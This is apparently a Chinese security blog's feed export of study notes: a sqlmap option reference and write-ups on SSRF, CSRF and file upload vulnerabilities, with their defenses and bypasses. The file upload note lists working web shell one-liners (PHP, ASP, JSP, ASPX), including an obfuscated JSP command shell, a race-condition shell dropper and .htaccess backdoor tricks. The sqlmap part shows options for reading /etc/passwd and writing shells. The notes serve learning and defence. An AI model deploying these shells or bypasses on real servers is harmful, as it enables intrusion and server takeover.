class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5. 优化探测过程</strong></p><pre class="line-numbers language-none"><code class="language-none">--level 1 默认配置level 2 检测cookie中是否含有注入level3 检测user-agent、referer是否含有注入level5 检测host是否含有注入--risk 默认1，最高4，等级高容易造成数据被纂改风险--predict-output  # 优惠检测方法，不断比对大数据，缩小检测范围，提高效率，与--threads参数不兼容--keep-alive # 长连接、性能好，避免重复建立的网络开销，但大量连接会占用服务器资源。与--proxy参数不兼容--null-connection # 只获取页面大小的值，通常用于盲注判断真假，与--text-only不兼容-o #直接开启以上三个--threads=7 # 提高并发线程，默认为1，建议不要超过10，否则影响站点可用性，与--predict-out 不兼容--string="woaini" # 页面比较，用于基于布尔注入的检测，因为有时候页面随时间阈值变化，此时需要人为指定标识真假的字符串--not-string="woaini"--regexp--code=200--text-only--titles="Welcome"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6. 特定目标环境</strong></p><pre class="line-numbers language-none"><code class="language-none">--skip-urlencode # 默认get传参会使用URL编码，但有些服务器没按规范，使用原始字符提交数据。--eval="import hashlib;hash=hashlib.md5(id).hexdigest()" # 在提交前，对参数进行python的处理，提升效率--dbms="Mysql" # 指定数据库类型，还可以加上版本 Mysql--os="Windows" # 指定操作系统，还可以是Linux--invalid-bignum # sqlmap默认使用负值让参数进行失效，该参数使用最大值让参数失效，比如id=9999999--invalid-logical # 使用布尔值，比如id 13 and 18=19--no-cast # 将sqlmap取出的数据转换为字符串，并用空格替换NULL结果，在老版本时需要开启此开关。--no-escape # 为了逃逸服务器端对sqlmap的检测，默认使用char()编码替换字符串。本参数将关闭此功能。比如select 'foo'--&gt;select char(102) +char(111) +char(111)--prefix ''')''' # 添加前缀 【')--suffix "AND('abc'='abc" #添加后缀 【AND('abc'='abc--tamper="tamper/between.py, tamper/randomcase.py" # 使用脚本，绕过IPS, WAF等--dns-domain attacker.com # 攻击者控制了DNS服务器，可以提高取出数据的效率--second-order http://1.1.1.1/b.php # 在一个页面注入的结果，从另一个页面体现出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7. 查看基本信息</strong></p><pre class="line-numbers language-none"><code class="language-none">-f # 扫描时加入数据库指纹检测-b # 查看数据库的版本信息--user # 查询所有的数据库账号--dbs  # 查询所有数据库--schema # 查询源数据库 (包含定义数据的数据)-a  # 查询当前user、当前数据库、主机名、当前user是否是最大权限管理员、数据库账号等-D dvwa # 指定数据库--current-user # 查询当前数据库用户--hostname # 查看服务器的主机名--Privileges -U username # 查询username的权限--roles 角色--tables # 查看所有的表-T # 指定表--columns # 查看所有的字段-C # 指定字段--count # 计数，查看有多少条数据--exclude-sysdbs # 排除系统库--dump # 查看数据--start 3 # 查看第三条--end 4 # 查看第四条--sql-query "select * from users" # 执行语句--common-columns # 暴力破解表--common-tables # 暴力破解表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>8. 其他参数</strong></p><pre class="line-numbers language-none"><code class="language-none">--batch # 自动选是-s: sqllite会话文件保存位置-t:  记录流量文件保存位置--charset=GBK: 强制字符编码--crawl=3 ： 爬站深度--csv-del=";" # 指定csv文件的分隔符--dbms-cred # 指定数据库账号--flush-session # 清空session--force-ssl # 强制使用HTTPS--fresh-queries # 重新检测，不使用本地已查询的数据--hex # 以16进制的形式编码dump出来的数据--output-dir # 输出目录--parse-errors # 分析和显示数据库内建报错信息--save ： 将命令保存成配置文件-z 参数助记符--answer="extending=N" # 回答--check-waf # 检测WAF/IPS/IDS--hpp # 绕过WAF/IPS/IDS--identify-waf # 彻底检测WAF/IPS/IDS--mobile # 模拟智能手机设备--purge-output # 清楚output文件夹--smart # 当有大量检测目标时，只选择基于错误的检测结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>9. 高级注入参数</strong></p><pre class="line-numbers language-none"><code class="language-none">--udf-inject,--shared-lib # 编译共享库创建并且上传至DB Server，依次生成UDF实现高级注入--file-read="/etc/passwd" # 文件系统访问--file-write="shell.php" --file-dest"/tmp/shell.php" #写文件到目标位置--sql-shell # 进入交互式mysql窗口操作系统访问注册表访问sqlmap.py -u http://navisec.it/123.asp?id=1 --tor -tor-type=SOCKS5 --torport=9050 --check-to<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注：具体sqlmap使用请查看如下网址：https-www-freebuf-com-sectool-245314-html"><a href="#注：具体sqlmap使用请查看如下网址：https-www-freebuf-com-sectool-245314-html" class="headerlink" title="注：具体sqlmap使用请查看如下网址：https://www.freebuf.com/sectool/245314.html"></a>注：具体sqlmap使用请查看如下网址：<a href="https://www.freebuf.com/sectool/245314.html">https://www.freebuf.com/sectool/245314.html</a></h3>]]></content>
      
      
      <categories>
          
          <category> sqlmap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap命令参数汇总 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf学习笔记</title>
      <link href="/2023/02/03/ssrf-xue-xi-bi-ji/"/>
      <url>/2023/02/03/ssrf-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<p><strong>原理：</strong></p><pre class="line-numbers language-none"><code class="language-none">ssrf全称Server-side Request Forgery，即服务端请求伪造攻击。是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，ssrf攻击的目标是从外网无法访问的内部系统。很多web应用都提供了从其它的服务器上获取数据的功能，使用指定的url，就可以通过web应用获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。也就是说，ssrf的漏洞点在于： 服务器提供了从其它服务器应用获取数据的功能，在用户可控的情况下，未对目标地址进行过滤和限制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ssrf的危害</strong></p><pre class="line-numbers language-none"><code class="language-none">- 可以对内网，外网即本机的端口进行扫描- 可以被当作代理对其它的服务器进行攻击- 可以访问在内网，但不对外网开放的web服务- 可以攻击内网中有漏洞的应用程序- 可以用各种file，dict，Gohper协议去实现该协议具有的功能- 可以上传木马，getshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ssrf出现的地方</strong></p><pre class="line-numbers language-none"><code class="language-none">1. 通过url地址分享网页内容2. 转码服务3. 在线翻译4. 图片、文章收藏5. 图片加载与下载6. 未公开的api实现以及其他调用url的功能7. 通过从url关键字查找(如： 1.share 2.wap 3.url  4.link 5.src 6.source 7.target  8.u  9.3g 10.display 11.sourceURl 12.imageURL  13.domain)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ssrf在php和java容易造成漏洞的函数</strong></p><pre class="line-numbers language-none"><code class="language-none">php：1.file_get_contents()    : 此函数最常见的直接用file_get_contents()加载url指向文件 2.fsockopen()   ：此函数会使用socket跟服务器建立tcp连接，传输原始数据。 3.curl_exec()  ：此函数支持多种协议如：ftp, ftps, http, https, gopher, telnet, dict, file, ldapa;4 fopen，5. curl  6. read_file()java:1.Imagel()  2.HttpClient() 3.OKHTTP 4.HTTPRequest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ssrf绕过技巧</strong></p><pre class="line-numbers language-none"><code class="language-none">1：对IP地址绕过 采用8进制 16进制 10进制编码的方式2：@符号绕过3：短网址绕过4：302跳转绕过5：dns重绑定6：句号绕过7：Enclosed alphanumerics绕过 (实体化编码绕过)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ssrf常用协议</strong></p><ul><li><p>Gopher协议：</p><p><img src="/images/gopher.png"></p></li></ul><h5 id="具体实现方法查看如下链接：Gopher协议的实现"><a href="#具体实现方法查看如下链接：Gopher协议的实现" class="headerlink" title="具体实现方法查看如下链接：Gopher协议的实现"></a>具体实现方法查看如下链接：<a href="https://blog.csdn.net/qq_60115503/article/details/124407499">Gopher协议的实现</a></h5><pre class="line-numbers language-none"><code class="language-none">- dict协议：  因为gopher协议使用的时候有环境限制，所以在必要的时候可以用dict协议替换gopher协议，dict协议是一个字典服务器协议，与gopher协议不同的是dict协议要一条一条执行，dict是基于查询响应的TCP协议，服务器监听端口2628- file协议：  本地文件传输协议，用于访问本地计算机中的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ssrf防御手段</strong></p><pre class="line-numbers language-none"><code class="language-none">1. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。2. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。3. 限制请求的端口为http常用的端口，比如，80,443,8080,8090。4. 黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。5. 禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/ssrf.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理分析 </tag>
            
            <tag> ssrf学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csrf学习笔记</title>
      <link href="/2023/02/03/csrf-xue-xi-bi-ji/"/>
      <url>/2023/02/03/csrf-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<p><strong>原理：</strong></p><pre class="line-numbers language-none"><code class="language-none">csrf全称Cross Site Request Forgery，俗称跨站点请求伪造。攻击者诱使受害者访问第三方网站，通过第三方网站向目标网站发起跨站请求，利用受害者在目标网站生产的身份凭证，从而绕过后台验证，达到冒充用户对被攻击网站执行某项操作的目的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>csrf造成的影响</strong></p><pre class="line-numbers language-none"><code class="language-none">在成功的csrf攻击中，攻击者会导致受害用户无意中执行操作。例如，更改其账户上的电子邮件地址、更改密码或进行资金转账。根据操作的性质，攻击者可能完全控制用户账户，如果遭到攻击的用户是一个特权用户，那么攻击者有可能完全控制应用程序的所有数据和功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>csrf攻击流程如下图所示：</strong></p><p><img src="/images/csrfgj.png"></p><p><strong>csrf防护手段</strong></p><pre class="line-numbers language-none"><code class="language-none">1. 二次验证，2. 验证referer头3. 增加csrf-token验证4. 限制cookie同源策略5. 添加验证码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>csrf防御绕过</strong></p><pre class="line-numbers language-none"><code class="language-none">1. 伪造referer头2. post改成get方式3. csrf-token没与当前用户进行绑定4. 删除csrf-token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>具体总结看如下图：</strong></p><p><img src="/images/csrfzj.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf学习 </tag>
            
            <tag> 漏洞原理分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传学习笔记</title>
      <link href="/2023/02/03/wen-jian-shang-chuan-xue-xi-bi-ji/"/>
      <url>/2023/02/03/wen-jian-shang-chuan-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<p><strong>文件上传漏洞原理</strong></p><pre class="line-numbers language-none"><code class="language-none">一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>危害</strong></p><pre class="line-numbers language-none"><code class="language-none">非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>防御</strong></p><pre class="line-numbers language-none"><code class="language-none">1. 文件扩展名服务端白名单效验2. 文件内容服务端效验3. 上传文件重命名4. 隐藏上传文件路径5. 限制相关目录的执行权限，防范WebShell攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检测与绕过</strong></p><p>无验证：<br>直接上传一句话木马或者WebShell脚本即可。</p><p>客户端检测（Javascript检测：<br>在网页上写一段Javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。如果上传文件的后缀不被允许，则会弹窗告知，此时文件上传的数据包并没有发送到服务端，只是在客户端浏览器使用Javascript对数据包进行检测</p><p>这时有两种方法可以绕过客户端Javascript的检测：</p><pre class="line-numbers language-none"><code class="language-none">1. 使用浏览器插件，删除检测文件后缀的Javascript代码，然后上传文件即可绕过2. 首先把需要上传的文件后缀改成允许上传的文件类型，如jpg、png、gif等，绕过Javascript检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>服务端检测（MINE类型检测）</strong></p><pre class="line-numbers language-none"><code class="language-none">MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（image/jpeg、image/png、image/gif），如果不是，则不允许上传该文件。<br>绕过方法：</p><pre class="line-numbers language-none"><code class="language-none">抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的Content-Type:application/octet-stream修改为image/jpeg、image/png、image/gif等就可以<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>常见MIMETYPE</p><pre class="line-numbers language-none"><code class="language-none">audio/mpeg -&gt; .mp3 application/msword -&gt; .doc application/octet-stream -&gt; .exe application/pdf -&gt; .pdf application/x-javascript -&gt; .js application/x-rar -&gt; .rar application/zip -&gt; .zip image/gif -&gt; .gif image/jpeg -&gt; .jpg / .jpeg image/png -&gt; .png text/plain -&gt; .txt text/html -&gt; .html video/mp4 -&gt; .mp4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>服务端检测（目录路径检测）</strong><br>对目录路径的检测不够严谨而导致可以使用%00截断绕过进行攻击。<br>绕过方法:</p><pre class="line-numbers language-none"><code class="language-none">例如：/111.php%00.gif/111.gif -&gt; /111.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>服务端检测（文件扩展名检测）</strong><br>绕过方法：</p><pre class="line-numbers language-none"><code class="language-none">- 文件名大小写绕过，如：*.pHp *.aSP- 文件名双写绕过，如：*.pphphp- Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为\u0070hp- 名单列表绕过，如：*.asa *.cer- 特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为*.php.或*.php+- 0x00截断绕过，比如：*.php(0x00).jpg 或 *.php%00.jpg- 文件包含漏洞- 服务器解析漏洞- .htaccess文件攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>文件截断绕过攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">截断类型：PHP%00截断截断原理：由于00代表结束符，所以会把00后面的所有字符删除截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>绕过方法：</p><pre class="line-numbers language-none"><code class="language-none">- 例如上传文件shell.php，上传文件路径为/?upload=shell.php- 绕过：/?upload=shell.php%00.jpg -&gt; /?upload=shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>解析漏洞攻击</strong><br>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p><p>目录解析：</p><pre class="line-numbers language-none"><code class="language-none">- 形式：www.xxx.com/xxx.asp/xxx.jpg- 原理：服务器会默认把 .asp 和 .asp目录下的文件都解析成asp文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>文件解析：</p><pre class="line-numbers language-none"><code class="language-none">- 形式：www.xxx.com/xxx.asp;.jpg- 原理：服务器默认不解析;后面的内容，因此xxx.asp;jpg被解析为xxx.asp文件了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Apache解析漏洞 #<br>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用后缀：*.php *.php3 *.php4 *.php5 *.phtml *.pht</p><p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。</p><p>因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p><pre class="line-numbers language-none"><code class="language-none">例如：shell.php.qwe.asd -&gt;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Nginx解析漏洞</p><pre class="line-numbers language-none"><code class="language-none">Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xxx.com/phpinfo.jpg/1.php这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击方式</p><pre class="line-numbers language-none"><code class="language-none">- 形式： www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg%00.php www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php- 另一种方法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>IIS7.5解析漏洞</p><pre class="line-numbers language-none"><code class="language-none">IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>竞争条件攻击</strong><br>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。<br>这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。<br>攻击方法：</p><pre class="line-numbers language-none"><code class="language-none">攻击者需要先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码"""&lt;?php    fputs(fopen("../shell.php", "w"),'&lt;?php @eval($_POST['cmd']); ?&gt;');?&gt;"""当1.php上传完成后，客户端立即访问1.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用了时间差完成了WebShell的上传<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>双文件上传</strong><br>本意为上传两个或多个文件去突破。上传点支持多文件上传，但是却只对第一个文件做了过滤。<br>利用方式：</p><pre class="line-numbers language-none"><code class="language-none">- 在存在双文件上传漏洞的页面中，查看上传的页面。F12找到上传的post表单，action属性是指定上传检测页面，一般是写的绝对路径，比如：xxx.asp/xxx.php- 补全url：https://www.xxx.com/xxx.php(asp)- 构造本地post提交表单`&lt;form action="https://www.xxx.com/xxx.asp(php)" method="post"name="form1" enctype="multipart/form‐data"&gt;&lt;input name="FileName1" type="FILE" class="tx1" size="40"&gt;&lt;input name="FileName2" type="FILE" class="tx1" size="40"&gt;&lt;input type="submit" name="Submit" value="上传"&gt;&lt;/form&gt;`利用时只需要修改action的值为指定上传页面即可- 第一个文件上传允许的文件类型（.jpg .png .gif 等），第二个上传文件是一句话木马或者WebShell脚本。这样就可以突破上传限制，成功上传木马到服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>php3457</strong></p><pre class="line-numbers language-none"><code class="language-none">该项为apache专属。关键点在/etc/apache2/mods-available/php5.6.conf这个文件，满足.+\.ph(p[3457]?|t|tml)$，都会被当作php文件解析。在apache2目录下grep -r x-httpd-php /etc/apache2找到对应文件就能知道解析哪些后缀。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>.htaccess文件攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">.htaccess文件(或者"分布式配置文件"）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般.htaccess可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个.htaccess文件即可。<br>绕过方法：</p><pre class="line-numbers language-none"><code class="language-none">- 针对黑名单绕过创建一个txt文件，写入`AddType  application/x-httpd-php    .png`另存为 .htaccess 名称，保存类型为所有文件，即可将png文件解析为php文件。- 留后门在.htaccess 内写入php解析规则，类似于把文件名包含s的解析成php文件`&lt;FilesMatch "s"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;`shell.png 就会以php文件执行- 利用.htaccess进行文件包含`php_value auto_prepend_file ".htaccess"#&lt;?php eval($_POST[cmd]);?&gt;`- 使用#注释使得.htaccess能够成功解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>服务器检测（文件内容检测）</strong><br>文件幻数检测（文件开头）</p><pre class="line-numbers language-none"><code class="language-none">幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要绕过文件幻数检测就要在文件开头写上如下的值</p><pre class="line-numbers language-none"><code class="language-none">.jpg    FF D8 FF E0 00 10 4A 46 49 46.gif    47 49 46 38 39 61.png    89 50 4E 47<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在文件幻数后面加上自己的WebShell代码就行</p><p>文件相关信息检测 #<br>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p><pre class="line-numbers language-none"><code class="language-none">例如下面结构GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一种是判断是否包含&lt;?或者php</p><pre class="line-numbers language-none"><code class="language-none">绕过&lt;?：&lt;script language='php'&gt;@eval($_POST[cmd]);&lt;/script&gt;绕过php：&lt;?= @eval($_POST['cmd']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绕过方法：</p><pre class="line-numbers language-none"><code class="language-none">对渲染/加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。对二次渲染的攻击方式就是攻击文件加载器自身。例如：上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数某后台调用GD库对图像进行二次渲染的代码 function image_gd_open($file, $extension) { $extension = str_replace('jpg', 'jpeg', $extension); $open_func = 'imageCreateFrom'. $extension; //函数名变成imageCreateFrompng 之类 if (!function_exists($open_func)) {     return FALSE; } return $open_func($file); //变成imagecreatefrompng('/tmp/phpimage') }对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access/mdb溢出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>文件上传中的目录穿越漏洞</strong><br>攻击方式</p><pre class="line-numbers language-none"><code class="language-none">形式：上传的文件会被解析为日志不能执行，给出了/uploads/xxx.php路径并且可以查询绕过：上传文件的时候抓包，修改文件名（filename）为./../../../../flag，上传成功后路径变为/uploads/./../../../../flag即可进行目录穿越<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>攻击代码</strong><br>常用攻击代码</p><pre class="line-numbers language-none"><code class="language-none">简单的一句话木马&lt;?php @eval($_POST['cmd']);?&gt;绕过&lt;?限制的一句话木马&lt;script language = 'php'&gt;@eval($_POST[cmd]);&lt;/script&gt;绕过&lt;?php ?&gt;限制的一句话木马&lt;?= @eval($_POST['cmd']);asp一句话木马&lt;%eval(Request.Item["cmd"],”unsafe”);%&gt;JSP一句话木马&lt;%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%&gt;JSP一句话免杀（ASCLL编码）&lt;%@ page contentType="text/html;charset=UTF-8"  language="java" %&gt;&lt;%    if(request.getParameter("cmd")!=null){        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd") );        java.io.InputStream in = e.getInputStream();        int a = -1;byte[] b = new byte[2048];out.print("&lt;pre&gt;");        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("&lt;/pre&gt;");    }%&gt;ASPX一句话&lt;script language="C#"runat="server"&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其它攻击代码</p><pre class="line-numbers language-none"><code class="language-none">异或取反等操作写shell的php脚本、混淆木马、不死马。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/upload.png" alt="upload"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理分析 </tag>
            
            <tag> 文件上传学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含原理</title>
      <link href="/2023/02/03/wen-jian-bao-han-yuan-li/"/>
      <url>/2023/02/03/wen-jian-bao-han-yuan-li/</url>
      
